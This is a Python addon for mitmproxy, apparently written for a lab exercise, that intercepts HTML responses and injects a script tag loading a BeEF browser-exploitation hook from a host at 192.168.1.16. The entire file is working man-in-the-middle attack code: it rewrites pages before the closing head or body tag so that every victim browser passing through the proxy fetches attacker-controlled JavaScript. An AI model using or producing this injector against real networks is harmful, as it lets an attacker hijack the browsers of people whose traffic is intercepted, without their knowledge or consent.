from mitmproxy import http

# --- CONFIGURATION ---
# Make sure this matches your BeEF hook URL
BEEF_HOOK_URL = "http://192.168.1.16:3000/hook.js"
INJECTION_CODE = f'<script src="{BEEF_HOOK_URL}"></script>'
# --- END CONFIGURATION ---

class BeEFInjector:
    def response(self, flow: http.HTTPFlow) -> None:
        """
        Modifies HTTP responses to inject the BeEF hook.
        """
        # Only process responses with Content-Type text/html
        # and ensure there's content to modify
        if flow.response and \
           flow.response.headers.get("content-type", "").startswith("text/html") and \
           flow.response.content:

            try:
                # Decode the response body (mitmproxy often handles this, but good practice)
                html_body = flow.response.text # .text handles decoding

                # Avoid injecting into already hooked pages or into the hook script itself
                if BEEF_HOOK_URL in html_body or flow.request.pretty_url == BEEF_HOOK_URL:
                    return

                # Try to inject before </head> or </body> for better rendering
                # This is a simple string replacement. A proper HTML parser (like BeautifulSoup)
                # would be more robust but adds complexity.
                injected = False
                if "</head>" in html_body:
                    html_body = html_body.replace("</head>", f"{INJECTION_CODE}</head>", 1)
                    injected = True
                elif "</body>" in html_body:
                    html_body = html_body.replace("</body>", f"{INJECTION_CODE}</body>", 1)
                    injected = True
                else:
                    # Fallback: if no body or head tag found (unlikely for full pages), append
                    # This might break some poorly formed pages or non-HTML content mistakenly identified.
                    # For a real page, we'd expect <body> or <head>.
                    # A better fallback for simple HTML snippets might be to prepend or append.
                    # For this exercise, if no clear spot, we'll log it.
                    print(f"[-] Could not find a clear injection point in: {flow.request.pretty_url}")


                if injected:
                    flow.response.text = html_body
                    print(f"[+] Injected BeEF hook into: {flow.request.pretty_url}")

            except Exception as e:
                print(f"[!] Error processing/injecting response for {flow.request.pretty_url}: {e}")

addons = [
    BeEFInjector()
]
